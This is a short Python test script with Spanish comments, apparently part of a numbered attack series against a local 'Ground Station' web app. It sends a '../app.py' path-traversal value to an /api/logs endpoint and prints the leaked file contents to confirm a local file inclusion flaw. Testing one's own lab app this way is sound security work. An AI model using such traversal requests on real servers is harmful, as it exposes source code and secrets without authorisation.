#!/usr/bin/env python3
"""
Prueba Individual - Ataque 4: Inclusión de Archivos Locales (LFI)
Demuestra la lectura no autorizada de archivos del servidor usando traversal ../.
"""
import requests

BASE_URL = "http://localhost:5000"

def test_attack_4():
    print("[+] Ejecutando Prueba Individual: Ataque 4 - Inclusión de Archivos Locales (LFI)...")
    target_file = "../app.py"
    url = f"{BASE_URL}/api/logs"
    try:
        response = requests.get(url, params={"file": target_file}, timeout=5)
        print(f"[*] GET {url}?file={target_file} - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] Vulnerabilidad LFI confirmada! Contenido leído del archivo:")
            print(response.text[:300] + "\n... (truncado)")
        else:
            print(f"[!] Respuesta: {response.text}")
    except Exception as e:
        print(f"[X] Error al conectar con la Ground Station: {e}")

if __name__ == "__main__":
    test_attack_4()
